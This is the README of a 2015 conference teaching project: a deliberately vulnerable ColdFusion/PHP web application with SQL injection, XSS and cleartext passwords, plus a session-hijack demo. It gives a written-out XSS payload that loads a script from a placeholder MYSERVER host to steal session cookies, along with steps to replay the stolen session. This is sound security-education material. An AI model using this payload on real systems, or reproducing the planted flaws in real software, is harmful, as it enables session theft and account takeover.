# Web Application Security 101
## NCDevCon 2015

This project contains a web application full of security holes in order to demonstrate how they can be exploited and how those exploits can be prevented.


Unfortunately, a video recording of the presentation is not available due to a power outage during the conference. I've tried to add more context to the slides but if anything is unclear please feel to reach out to me on Twitter at [@kipthegreat](//twitter.com/kipthegreat) or via my website http://ampersand.space/contact/.

## What Is Included

* Slides from presentation: Web_Application_Security_101.pdf
* MySQL database dump: ncdevcon_security.sql
* ColdFusion version of demo application full of vulnerabilities: ncdevcon_security_cf/
* PHP version of demo application full of vulnerabilities: ncdevcon_security_php/
* Hijack demo application (contains both PHP and ColdFusion implementation): ncdevcon_security_hijack/

The ColdFusion and PHP applications are annotated with comments around all the security vulnerabilities. The two applications are near-exact line-for-line ports of one another.

The application lets users log in to a web application. Users have roles 'user' and/or 'admin'. Users with 'admin' role are allowed to view a list of all users and edit their user details. Users without 'admin' role are only able to edit their own user details. However, through a number of vulnerabilities, normal users would be able to obtain administrator privileges.

## Setup

1. Load the MySQL database (ncdevcon_security.sql).
1. **Suggestion**: If you are running anywhere besides localhost, because this application is full of security holes, create a separate database user that is only able to access the test database, and only able to run select/insert/update/delete.
1. For the ColdFusion version:
  1. Create a datasource named "ncdevcon_security" in ColdFusion Administrator pointing to this database.
  1. To be able to run session hijack demo, **HTTPOnly** option must be disabled (Server Settings / Memory Variables / Session Cookie Settings).  *(This is a security risk, so be sure to change it back when you are done.)*
1. For the PHP version:
  1. Fill in the database credentials in application.php
  1. To be able to run session hijack demo, you need to set `php_flag session.cookie_httponly off` option in php.ini or .htaccess. *(This is a security risk, so be sure to change it back when you are done.)*
1. The ncdevcon_security_hijack folder should be put on a different server for best demostration, but it is not necessary.
1. In ncdevcon_security_hijack project:
  1. Edit hijack2.js, setting absolute url to the hijack_logger.cfm or hijack_logger.php file.

## Security Holes

Some of the security holes you can note:

* Passwords are stored in database in clear text.
* SQL injection vulnerabilities in nearly every query.
* XSS vulnerability in Manage Users screen.
* No permissions check--normal user can access Manage Users screen via URL.
* Edit User screen takes unsecured `userId` URL parameter.

## Using Session Hijack Demo

1. Edit a user's name to: `<img src="//bit.ly/1nHdObD" onload="s=document.createElement('script');s.src='//MYSERVER/ncdevcon_security_hijack/hijack2.js';document.head.appendChild(s);" />`
1. View the manage users page.
1. Check the ncdevcon_security_hijack/hijack_log.txt file. Copy the sample code to the clipboard.
1. Open a new Chrome Incognito browser and go to the index page. (At this point you should not be logged in.)
1. Open browser tools and paste the javascript code and run it.
1. Now refresh page. You should have now hijacked the session.
